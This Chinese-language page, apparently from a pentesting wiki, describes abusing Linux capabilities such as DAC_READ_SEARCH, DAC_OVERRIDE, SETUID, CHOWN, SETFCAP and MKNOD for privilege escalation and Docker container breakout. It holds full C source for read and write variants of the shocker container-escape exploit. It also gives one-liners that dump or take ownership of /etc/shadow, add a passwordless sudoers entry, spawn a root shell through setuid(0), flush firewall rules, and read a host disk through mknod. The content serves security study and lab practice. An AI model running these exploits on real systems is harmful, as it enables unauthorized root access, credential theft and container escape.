[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取权限，以及目录读取和执行权限**。它主要用于文件搜索或读取。然而，它还允许进程使用 `open_by_handle_at(2)` 函数访问任何文件，包括进程挂载命名空间之外的文件。`open_by_handle_at(2)` 使用的句柄应当是通过 `name_to_handle_at(2)` 获取的非透明标识符，但其中可能包含 inode 编号等容易被篡改的敏感信息。Sebastian Krahmer 通过 shocker exploit 展示了该 capability 的潜在利用方式，尤其是在 Docker 容器环境中的利用方式，相关分析见[此处](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)。
**这意味着你可以** **绕过文件读取权限检查以及目录读取/执行权限检查。**

**使用 binary 的示例**

该 binary 将能够读取任意文件。因此，如果 tar 等文件具有此 capability，它就能够读取 shadow 文件：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**使用 binary2 的示例**

在此例中，假设 **`python`** binary 具有此 capability。要列出 root 文件，可以执行：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
为了读取文件，你可以执行：
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

你可以使用以下命令检查 docker 容器内启用的 capabilities：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中可以看到，**DAC_READ_SEARCH** capability 已启用。因此，容器可以 **debug processes**。

你可以在 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 中了解以下 exploit 的工作原理，但简而言之，**CAP_DAC_READ_SEARCH** 不仅允许我们在不进行权限检查的情况下遍历文件系统，还会显式移除对 _**open_by_handle_at(2)**_ 的所有检查，并且**可能允许我们的进程访问其他进程打开的敏感文件**。

最初用于利用此权限读取主机文件的 exploit 可以在此处找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个**修改后的版本，允许你将要读取的文件作为第一个参数，并将其 dump 到文件中。**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit 需要找到一个指向 host 上某个挂载对象的 pointer。原始 exploit 使用的是文件 /.dockerinit，而这个修改后的版本使用 /etc/hostname。如果 exploit 无法正常工作，可能需要设置其他文件。要查找 host 上已挂载的文件，只需执行 mount 命令：

![CAP SYS MODULE - CAP DAC READ SEARCH：exploit 需要找到一个指向 host 上某个挂载对象的 pointer。原始 exploit 使用的是文件 /.dockerinit，而这个修改后的版本使用……](<../../images/image (407) (1).png>)

**此 technique 的代码复制自 "Abusing DAC_READ_SEARCH Capability" laboratory，来源为** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**这意味着你可以绕过对任意文件的写入权限检查，因此可以写入任意文件。**

有很多文件可以被**覆盖以提升权限，**[**你可以从这里获取一些思路**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用 binary 的示例**

在此示例中，vim 具有此 capability，因此你可以修改任意文件，例如 _passwd_、_sudoers_ 或 _shadow_：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**使用 binary 2 的示例**

在此示例中，**`python`** binary 将拥有此 capability。你可以使用 python 覆盖任意文件：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**环境变量 + CAP_DAC_READ_SEARCH 示例（Docker breakout）**

你可以使用以下命令检查 Docker 容器内启用的 capabilities：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
首先阅读上一节，其中[**滥用 DAC_READ_SEARCH capability 读取主机上的任意文件**](linux-capabilities.md#cap_dac_read_search)，并**编译**该 exploit。\
然后，**编译以下版本的 shocker exploit**，它将允许你在主机文件系统中**写入任意文件**：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
为了逃逸 Docker 容器，你可以从主机**下载**文件 `/etc/shadow` 和 `/etc/passwd`，向其中**添加**一个**新用户**，并使用 **`shocker_write`** 覆盖它们。然后通过 **ssh** **访问**。

**该技术的代码复制自 "Abusing DAC_OVERRIDE Capability" 实验，实验来自** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**这意味着可以更改任何文件的所有权。**

**使用 binary 的示例**

假设 **`python`** binary 具有此 capability，你可以更改 **shadow** 文件的**所有者**、**更改 root 密码**，并提升权限：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
或者是具有此 capability 的 **`ruby`** binary：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**这意味着可以修改任意文件的权限。**

**使用 binary 的示例**

如果 Python 具有此 capability，就可以修改 shadow file 的权限、**更改 root password**，并进行提权：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**这意味着可以设置所创建进程的有效用户 ID。**

**使用 binary 的示例**

如果 python 具有此 **capability**，就可以非常轻松地滥用它将权限提升至 root：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**另一种方法：**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**这意味着可以设置所创建进程的有效组 ID。**

有许多文件可以**覆盖以提升权限，**[**你可以从这里获取思路**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**二进制文件示例**

在这种情况下，你应该查找组可以读取的有趣文件，因为你可以冒充任意组：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
找到一个可以通过读取或写入来滥用并提升权限的文件后，你可以使用以下方式**获取一个模拟目标组身份的 shell**：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
在这种情况下，shadow 组被冒充，因此你可以读取文件 `/etc/shadow`：
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

当同一个 helper 中同时具备这两个 capability 时，一个实用的 chain 是：

1. 将 EGID 切换为 `shadow`（或其他 privileged group）。
2. 对 `/etc/shadow` 使用 `chown`，将其 UID 设置为你的 UID，同时保留 `shadow` group。
3. 读取目标 hash，然后 crack/pivot。
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
这样无需直接获得完整的 root 权限，通常就足以通过 credential reuse 实现 pivot。

如果已安装 **docker**，你可以 **impersonate** **docker group**，并滥用它与 [**docker socket** 通信并提升权限](#writable-docker-socket)。

## CAP_SETFCAP

**这意味着可以在文件和进程上设置 capabilities**

**使用 binary 的示例**

如果 python 具有此 **capability**，就可以非常轻松地滥用它将权限提升至 root：
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> 注意，如果你使用 CAP_SETFCAP 为二进制文件设置新的 capability，将会失去此 capability。

一旦你拥有 [SETUID capability](linux-capabilities.md#cap_setuid)，就可以前往其章节查看如何进行权限提升。

**使用 environment 的示例（Docker breakout）**

默认情况下，**Docker 会将 CAP_SETFCAP capability 授予容器内的进程**。你可以通过执行类似以下操作进行检查：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
此 capability 允许**向二进制文件授予任何其他 capability**，因此我们可以考虑**利用**本页中提到的其他 capability breakout 来**逃逸**容器。\
但是，如果你尝试向 gdb 二进制文件授予例如 CAP_SYS_ADMIN 和 CAP_SYS_PTRACE，你会发现虽然可以授予它们，但**该二进制文件之后将无法执行**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html)：_Permitted：这是线程可以采用的 **effective capabilities** 的**限制性超集**。对于不具备 **CAP_SETPCAP** capability 的线程，它也是该线程可以添加到 **inheritable set** 中的 capabilities 的限制性超集。_\
看起来，Permitted capabilities 限制了可以使用的 capabilities。\
但是，Docker 默认也授予 **CAP_SETPCAP**，因此你可能能够**在 inheritable set 中设置新的 capabilities**。\
然而，在该 capability 的文档中：_CAP_SETPCAP：\[…] **将 calling thread 的 bounding set 中的任意 capability 添加到其 inheritable set**。_\
看起来，我们只能将 bounding set 中的 capabilities 添加到 inheritable set。这意味着，**我们无法将 CAP_SYS_ADMIN 或 CAP_SYS_PTRACE 等新的 capabilities 放入 inherit set 来提升权限**。

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供了许多敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` system calls，以及执行各种磁盘命令。通过此 capability 还会启用 `FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引发问题。根据 man page，该 capability 的持有者还可以描述性地**在其他设备上执行一系列特定于设备的操作**。

这对于**privilege escalation** 和 **Docker breakout** 很有用。

## CAP_KILL

**这意味着可以 kill 任意 process。**

**Example with binary**

假设 **`python`** binary 具有此 capability。如果你还能够**修改某个 service 或 socket configuration**（或任何与 service 相关的 configuration file），就可以对其植入 backdoor，然后 kill 与该 service 相关的 process，并等待使用你的 backdoor 执行新的 configuration file。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**使用 kill 进行 Privesc**

如果你拥有 kill capabilities，并且有一个以 **root**（或其他用户）身份运行的 **node 程序**，你可能可以向它**发送** **signal SIGUSR1**，使其**打开 node debugger**，这样你就可以连接到它。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**这意味着可以监听任意端口（甚至是特权端口）。** 无法直接利用此 capability 提升权限。

**使用 binary 的示例**

如果 **`python`** 具有此 capability，它将能够监听任意端口，甚至可以从该端口连接到其他任意端口（某些服务要求连接必须来自特定的特权端口）。

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability 允许进程**创建 RAW 和 PACKET 套接字**，从而生成并发送任意网络数据包。这可能在容器化环境中引发安全风险，例如数据包 spoofing、流量注入以及绕过网络访问控制。恶意行为者可能利用此能力干扰容器路由或危害主机网络安全，尤其是在缺乏充分 firewall 保护的情况下。此外，对于特权容器而言，**CAP_NET_RAW** 对支持通过 RAW ICMP 请求执行 ping 等操作至关重要。

**这意味着可以 sniff 流量。** 但无法仅凭此 capability 直接提升权限。

**使用 binary 的示例**

如果 binary **`tcpdump`** 具有此 capability，你就可以使用它捕获网络信息。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
注意，如果 **environment** 赋予了此 capability，你也可以使用 **`tcpdump`** 来 sniff traffic。

**使用 binary 2 的示例**

以下示例是 **`python2`** 代码，可用于拦截 "**lo**"（**localhost**）interface 的 traffic。代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) 上的实验 "_The Basics: CAP-NET_BIND + NET_RAW_"。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 能力赋予持有者**修改网络配置**的权限，包括在已暴露的 network namespaces 中修改防火墙设置、路由表、socket 权限以及网络接口设置。它还支持在网络接口上启用**混杂模式**，从而能够跨 namespaces 进行数据包 sniffing。

**使用 binary 的示例**

假设 **python binary** 具有这些能力。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**这意味着可以修改 inode 属性。** 无法直接利用此 capability 提升权限。

**使用 binary 的示例**

如果你发现某个文件是 immutable 的，并且 python 具有此 capability，则可以**移除 immutable 属性，使该文件变为可修改状态：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> 请注意，通常使用以下命令设置和移除该 immutable attribute：
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 支持执行 `chroot(2)` system call，这可能允许通过已知漏洞逃逸 `chroot(2)` environments：

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 不仅允许执行 `reboot(2)` system call 以重启系统，包括针对特定硬件平台的特定命令（如 `LINUX_REBOOT_CMD_RESTART2`），还支持使用 `kexec_load(2)`，以及从 Linux 3.17 开始使用 `kexec_file_load(2)`，分别用于加载新的或已签名的 crash kernels。

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离出来，专门授予使用 `syslog(2)` call 的能力。当 `kptr_restrict` 设置为 1 时，该 capability 支持通过 `/proc` 和类似 interfaces 查看 kernel addresses；此设置用于控制 kernel addresses 的暴露程度。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，表示会暴露 kernel addresses，不过出于 security reasons，许多 distributions 会将其设置为 1（除 uid 0 外隐藏 addresses）或 2（始终隐藏 addresses）。

此外，当 `dmesg_restrict` 设置为 1 时，**CAP_SYSLOG** 允许访问 `dmesg` output。尽管发生了这些变化，由于历史原因，**CAP_SYS_ADMIN** 仍保留执行 `syslog` operations 的能力。

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` system call 的功能，使其不仅能创建 regular files、FIFOs（named pipes）或 UNIX domain sockets，还能创建 special files，具体包括：

- **S_IFCHR**：Character special files，即 terminals 等 devices。
- **S_IFBLK**：Block special files，即 disks 等 devices。

对于需要创建 device files 的 processes，此 capability 至关重要，因为它支持通过 character 或 block devices 直接与 hardware 交互。

这是默认的 docker capability（[https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。

在以下条件下，该 capability 可通过对 host 执行 full disk read 来实现 privilege escalations：

1. 对 host 具有初始访问权限（Unprivileged）。
2. 对 container 具有初始访问权限（Privileged（EUID 0），并拥有 effective `CAP_MKNOD`）。
3. Host 和 container 应共享相同的 user namespace。

**在 Container 中创建和访问 Block Device 的步骤：**

1. **以 Standard User 身份在 Host 上：**

- 使用 `id` 确定当前 user ID，例如：`uid=1000(standarduser)`。
- 确定目标 device，例如 `/dev/sdb`。

2. **以 `root` 身份在 Container 内：**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **回到主机：**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
此方法允许 standard user 通过 container 访问并可能读取 `/dev/sdb` 中的数据，利用了 shared user namespaces 以及设备上设置的 permissions。

### CAP_SETPCAP

**CAP_SETPCAP** 允许一个进程**修改另一个进程的 capability sets**，从而能够向 effective、inheritable 和 permitted sets 添加或移除 capabilities。不过，进程只能修改其自身 permitted set 中拥有的 capabilities，确保它无法将另一个进程的 privileges 提升到超过自身的程度。近期的 kernel 更新进一步收紧了这些规则，将 `CAP_SETPCAP` 限制为只能降低其自身或其 descendants 的 permitted sets 中的 capabilities，旨在降低 security risks。使用该功能需要在 effective set 中拥有 `CAP_SETPCAP`，并在 permitted set 中拥有目标 capabilities，然后通过 `capset()` 执行修改。这概括了 `CAP_SETPCAP` 的核心功能和限制，突出了其在 privilege management 和 security enhancement 中的作用。

**`CAP_SETPCAP`** 是一种 Linux capability，允许进程**修改另一个进程的 capability sets**。它允许向其他进程的 effective、inheritable 和 permitted capability sets 添加或移除 capabilities。不过，如何使用该 capability 存在一些限制。

拥有 `CAP_SETPCAP` 的进程**只能授予或移除其自身 permitted capability set 中的 capabilities**。换句话说，如果一个进程自身不具备某项 capability，就不能将该 capability 授予另一个进程。这一限制可以防止进程将另一个进程的 privileges 提升到超过自身 privilege level 的程度。

此外，在近期的 kernel versions 中，`CAP_SETPCAP` capability 受到**进一步限制**。它不再允许进程任意修改其他进程的 capability sets。相反，它**只允许进程降低其自身 permitted capability set 或其 descendants 的 permitted capability set 中的 capabilities**。引入这一变更是为了降低与该 capability 相关的潜在 security risks。

要有效使用 `CAP_SETPCAP`，需要在 effective capability set 中拥有该 capability，并在 permitted capability set 中拥有目标 capabilities。随后可以使用 `capset()` system call 修改其他进程的 capability sets。

总而言之，`CAP_SETPCAP` 允许进程修改其他进程的 capability sets，但不能授予其自身不具备的 capabilities。此外，出于 security concerns，近期 kernel versions 已将其功能限制为只能降低其自身 permitted capability set 或其 descendants 的 permitted capability sets 中的 capabilities。

## 参考资料

